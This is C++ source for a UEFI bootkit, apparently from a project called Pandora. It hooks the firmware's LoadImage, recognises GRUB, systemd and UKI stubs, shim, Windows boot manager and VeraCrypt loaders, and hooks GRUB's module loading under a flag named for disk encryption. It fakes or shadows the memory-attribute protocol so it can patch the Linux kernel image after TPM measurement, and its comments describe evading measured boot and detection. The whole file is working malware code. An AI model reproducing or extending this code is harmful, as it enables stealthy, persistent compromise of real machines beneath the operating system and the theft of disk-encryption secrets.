#include <bootkit/binary/heuristic.hpp>
#include <bootkit/binary/identifier.hpp>
#include <bootkit/binary/pe.hpp>
#include <bootkit/general.hpp>
#include <bootkit/hooking/service_ptr.hpp>
#include <bootkit/hooks/efi.hpp>
#include <bootkit/hooks/bzimage.hpp>
#include <bootkit/hooks/grub.hpp>
#include <bootkit/interfaces.hpp>

#include <bootkit/grub/grubx64.hpp>

extern "C" {
#include <Uefi.h>

#include <Library/BaseMemoryLib.h>
#include <Library/DevicePathLib.h>
#include <Protocol/DevicePathToText.h>
#include <Protocol/LoadedImage.h>
}

EFI_STATUS EFIAPI hooks::efi::LoadImage(BOOLEAN BootPolicy, EFI_HANDLE ParentImageHandle,
                                        EFI_DEVICE_PATH_PROTOCOL *DevicePath, VOID *SourceBuffer,
                                        UINTN SourceSize, EFI_HANDLE *ImageHandle)
{
  CHAR16 *path = nullptr;
  EFI_STATUS res;
  image_type loaded_image_type;
  EFI_HANDLE handle;
  uintptr_t base;
  size_t size;
  uintptr_t shim_st_hooker;
  uintptr_t shim_st_unhooker;

  if (i::device_path_protocol == nullptr) {
    res = g::bs->LocateProtocol(&guid::device_path_protocol, nullptr,
                                reinterpret_cast<void **>(&i::device_path_protocol));
    if (EFI_ERROR(res)) {
      dbg::print(DEBUG_ERROR, "Couldn't find device path procol\r\n");
    }
  }

  path = i::device_path_protocol ?
             i::device_path_protocol->ConvertDevicePathToText(DevicePath, TRUE, TRUE) :
             L"<Failed to acquire path>"_uefi;
  res = original_LoadImage(BootPolicy, ParentImageHandle, DevicePath, SourceBuffer, SourceSize,
                           ImageHandle);
  if (EFI_ERROR(res)) {
    return res;
  }

  handle = *ImageHandle;
  loaded_image_type = identify_image(handle, &base, &size);
  dbg::print(DEBUG_INFO, "Loaded image with path %s\r\n", path);
  switch (loaded_image_type) {
  case GRUB:
    g::state |= GRUB_LOADED;
    dbg::print(DEBUG_INFO, "Identified image as GRUB\r\n");
#if !defined(_PANDORA_DISABLE_GRUB_FDE_HOOK)
    if (!grubx64::init_grub_internals(base, size)) {
      dbg::print(DEBUG_ERROR, "Could not parse GRUB headers\r\n");
      break;
    }

    if (!grubx64::find_symtab()) {
      dbg::print(DEBUG_ERROR, "Could not find GRUB symtab\r\n");
      break;
    }

    if (!jmp_hook(grubx64::find_symbol("grub_dl_load_core_noinit"),
                  reinterpret_cast<uintptr_t>(hooks::grub::grub_dl_load_core_noinit),
                  &hooks::grub::grub_dl_load_core_noinit_ctx)) {
      dbg::print(DEBUG_ERROR, "Failed to hook grub_dl_load_core_noinit\r\n");
    }
#endif // _PANDORA_DISABLE_GRUB_FDE_HOOK
    break;
  case SYSTEMD_BOOT:
    g::state |= SYSTEMD_BOOT_LOADED;
    dbg::print(DEBUG_INFO, "Identified image as SystemD Boot\r\n");
    break;
  case BZIMAGE:
    g::state |= BZIMAGE_LOADED;
    g::target_system = LINUX;
    dbg::print(DEBUG_INFO, "Identified image as bzImage\r\n");
    if (!hooks::bzimage::do_hook_bzimage(base, size)) {
      dbg::print(DEBUG_ERROR, "Failed to hook bzImage\r\n");
    }

    break;
  case SYSTEMD_STUB:
    g::state |= SYSTEMD_STUB_LOADED;
    g::target_system = LINUX;
    dbg::print(DEBUG_INFO, "Identified image as SystemD stub\r\n");
    break;
  case SYSTEMD_STUB_UKI:
  case STUB_UKI:
    uki_image_base = base;
    uki_image_end = base + size;
    original_LocateProtocol = swap_service_ptr(&g::bs->Hdr, &g::bs->LocateProtocol, LocateProtocol);
    g::state |= loaded_image_type == STUB_UKI ? UKI_LOADED : SYSTEMD_STUB_LOADED;
    g::target_system = LINUX;
    dbg::print(DEBUG_INFO, "Identified image as SystemD stub (UKI)\r\n");
    dbg::print(DEBUG_INFO, "Hooked LocateProtocol to fake EFI_MEMORY_ATTRIBUTE_PROTOCOL for UKI stub\r\n");
    break;
  case SHIMLOADER:
    dbg::print(DEBUG_INFO, "Identified image as SHIM loader\r\n");
    if (!heuristic::shim_find_system_services_hook_functions(base, size, &shim_st_hooker,
                                                             &shim_st_unhooker)) {
      dbg::print(DEBUG_ERROR, "shim_find_system_services_hook_functions failed\r\n");
    }
    else {
      dbg::print(DEBUG_INFO, "shim_st_hooker -> %p\r\nshim_st_unhooker -> %p\r\n", shim_st_hooker,
                 shim_st_unhooker);
    }

    // SHIM loader compatibility is unfinished
    // it hooks system services, implements TPM measurements (doesn't verify itself), passes
    // their custom system table pointer to mapped binaries. if you simply hook its LoadImage
    // hook and patch from there, start_image will measure your modified image. instead, hook
    // at start_image call to the image entrypoint. it registers a protocol other bootloaders
    // then can use for TPM, but they (I'm nearly certain of that) only measure after loading,
    // but patching inside StartImage is fine if you check if the caller is not shimloader (?)

    break;
  case BOOTMGFW:
    g::state |= BOOTMGFW_LOADED;
    g::target_system = WINDOWS;
    dbg::print(DEBUG_INFO, "Identified image as bootmgfw\r\n");
    break;
  //case WINLOAD:
  //  g::state |= WINLOAD_LOADED;
  //  break;
  case VERACRYPT:
    g::state |= VERACRYPT_LOADED;
    dbg::print(DEBUG_INFO, "Identified image as veracrypt\r\n");
    break;
  case UNKNOWN_IMAGE:
  default:
    break;
  }

  return res;
}

static EFI_STATUS EFIAPI GetMemoryAttributes_nullstub(EFI_MEMORY_ATTRIBUTE_PROTOCOL *This,
                                                      EFI_PHYSICAL_ADDRESS BaseAddress,
                                                      UINT64 Length, UINT64 *Attributes)
{
  // standard verifications, makes it very slightly harder to detect its a nullstub
  // if someone calls this with bogus parameters
  if (!IS_ALIGNED(BaseAddress, EFI_PAGE_SIZE)) {
    return EFI_UNSUPPORTED;
  }

  if (!IS_ALIGNED(Length, EFI_PAGE_SIZE)) {
    return EFI_UNSUPPORTED;
  }

  if (Length == 0) {
    return RETURN_INVALID_PARAMETER;
  }

  if (Attributes == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  // placeholder, I might change to reflect reality
  *Attributes = EFI_MEMORY_RP;

  return EFI_SUCCESS;
}

static EFI_STATUS SetMemoryAttributes_nullstub(EFI_MEMORY_ATTRIBUTE_PROTOCOL *This,
                                               EFI_PHYSICAL_ADDRESS BaseAddress, UINT64 Length,
                                               UINT64 Attributes)
{
  if (Attributes == 0) {
    return EFI_INVALID_PARAMETER;
  }

  if ((Attributes & ~EFI_MEMORY_ACCESS_MASK) != 0) {
    return EFI_INVALID_PARAMETER;
  }

  if (Length == 0) {
    return RETURN_INVALID_PARAMETER;
  }

  return EFI_SUCCESS;
}

static EFI_STATUS EFIAPI ClearMemoryAttributes_nullstub(EFI_MEMORY_ATTRIBUTE_PROTOCOL *This,
                                                        EFI_PHYSICAL_ADDRESS BaseAddress,
                                                        UINT64 Length, UINT64 Attributes)
{
  // standard verifications, makes it very slightly harder to detect its a nullstub
  // if someone calls this with bogus parameters
  if (Attributes == 0) {
    return EFI_INVALID_PARAMETER;
  }

  if ((Attributes & ~EFI_MEMORY_ACCESS_MASK) != 0) {
    return EFI_INVALID_PARAMETER;
  }

  if (Length == 0) {
    return RETURN_INVALID_PARAMETER;
  }

  return EFI_SUCCESS;
}

EFI_STATUS EFIAPI hooks::efi::LocateProtocol(EFI_GUID *Protocol, VOID *Registration,
                                             VOID **Interface)
{
  static EFI_MEMORY_ATTRIBUTE_PROTOCOL *memory_proto;
  static bool table_properly_hooked;
  uintptr_t return_address;
  EFI_STATUS res;

  if (!Protocol || !Interface || !CompareGuid(Protocol, &guid::memory_protocol))
    return original_LocateProtocol(Protocol, Registration, Interface);

  // ensure we got called from within UKI
  return_address = reinterpret_cast<uintptr_t>(__builtin_return_address(0));
  if (return_address < uki_image_base || return_address > uki_image_end)
    return original_LocateProtocol(Protocol, Registration, Interface);

  // allocate shadow, avoid patching original table
  if (memory_proto == nullptr) {
    res = g::bs->AllocatePages(AllocateAnyPages, EfiBootServicesData,
                               EFI_SIZE_TO_PAGES(sizeof(EFI_MEMORY_ATTRIBUTE_PROTOCOL)),
                               reinterpret_cast<EFI_PHYSICAL_ADDRESS *>(&memory_proto));
    if (EFI_ERROR(res)) {
      dbg::print(DEBUG_ERROR, "Failed to allocate shadow EFI_MEMORY_ATTRIBUTE_PROTOCOL\r\n");
      return original_LocateProtocol(Protocol, Registration, Interface);
    }
  }

  // get original table to copy from
  res = original_LocateProtocol(Protocol, Registration, Interface);
  // vmware and other old firmware don't implement this, so just fake one with nullstubs.
  // we do that because SystemD stub hands us bzImage code section pointer and size post
  // TPM extend and remapping, so we can simply patch it there
  if (EFI_ERROR(res)) {
    if (res != EFI_NOT_FOUND) {
      dbg::print(DEBUG_ERROR, "LocateProtocol failed for EFI_MEMORY_ATTRIBUTE_PROTOCOL (%r)\r\n",
                 res);
      return res;
    }

    dbg::print(DEBUG_INFO, "EFI_MEMORY_ATTRIBUTE_PROTOCOL not implemented, faking one\r\n");
    memory_proto->ClearMemoryAttributes = ClearMemoryAttributes_nullstub;
    memory_proto->GetMemoryAttributes = GetMemoryAttributes_nullstub;
    memory_proto->SetMemoryAttributes = hooks::efi::SetMemoryAttributes;
    original_SetMemoryAttributes = SetMemoryAttributes_nullstub;
    *Interface = memory_proto;
    return EFI_SUCCESS;
  }

  if (!table_properly_hooked) {
    CopyMem(memory_proto, *Interface, sizeof(EFI_MEMORY_ATTRIBUTE_PROTOCOL));
    original_SetMemoryAttributes = memory_proto->SetMemoryAttributes;
    memory_proto->SetMemoryAttributes = hooks::efi::SetMemoryAttributes;
    dbg::print(DEBUG_INFO, "Spoofed EFI_MEMORY_ATTRIBUTE_PROTOCOL\r\n");
  }

  table_properly_hooked = true;
  *Interface = memory_proto;
  return res;
}

EFI_STATUS EFIAPI hooks::efi::SetMemoryAttributes(EFI_MEMORY_ATTRIBUTE_PROTOCOL *This,
                                                  EFI_PHYSICAL_ADDRESS BaseAddress, UINT64 Length,
                                                  UINT64 Attributes)
{
  uint8_t *c;
  void *sig;
  UINT64 count;
  uintptr_t return_address;
  uintptr_t _linux_section;
  size_t _linux_size;
  bool is_bzimage;

  // ensure we got called from within UKI
  return_address = reinterpret_cast<uintptr_t>(__builtin_return_address(0));
  if (return_address < uki_image_base || return_address > uki_image_end)
    return original_SetMemoryAttributes(This, BaseAddress, Length, Attributes);

  // SystemD stub sets EFI_MEMORY_RO, then calls ClearMemoryAttributes with EFI_MEMORY_XP:
  // https://github.com/systemd/systemd/blob/77b9a626ce0a79858d946ac73f4950e9e4c6f28a/src/boot/linux.c#L116
  if (!(Attributes & EFI_MEMORY_RO))
    return original_SetMemoryAttributes(This, BaseAddress, Length, Attributes);

  // we are in linux_exec, after TPM measurements and before handover. verify that BaseAddress is
  // bzImage code, then patch before RO protection. count must be long enough for an unique
  // signature
  // https://github.com/systemd/systemd/blob/e3a224a46dea61b861d3f6ea79ad4abb0fab4b3a/src/boot/stub.c#L1310
  // https://github.com/systemd/systemd/blob/e3a224a46dea61b861d3f6ea79ad4abb0fab4b3a/src/boot/linux.c#L336
  count = MIN(Length, 128);
  if (count < 32 /* not long enough */)
    return original_SetMemoryAttributes(This, BaseAddress, Length, Attributes);

  // shouldn't ever be possible, just in case
  if (!pe::get_section(uki_image_base, ".linux", &_linux_section, &_linux_size))
    return original_SetMemoryAttributes(This, BaseAddress, Length, Attributes);

  if (_linux_size < count)
    return original_SetMemoryAttributes(This, BaseAddress, Length, Attributes);

  // finally, check if it is bzImage or not
  c = reinterpret_cast<uint8_t *>(_linux_section);
  sig = reinterpret_cast<void *>(BaseAddress);
  is_bzimage = false;
  for (size_t i = 0; i < _linux_size - count; i++) {
    if (CompareMem(&c[i], sig, count) == 0) {
      is_bzimage = true;
      break;
    }
  }

  // the previous logic can fail if any byte changed
  if (!is_bzimage)
    is_bzimage = heuristic::is_bzimage(BaseAddress, Length);

  if (is_bzimage) {
    if (!hooks::bzimage::do_hook_bzimage(BaseAddress, Length)) {
      dbg::print(DEBUG_ERROR, "Failed to hook bzImage\r\n");
    }
  }

  return original_SetMemoryAttributes(This, BaseAddress, Length, Attributes);
}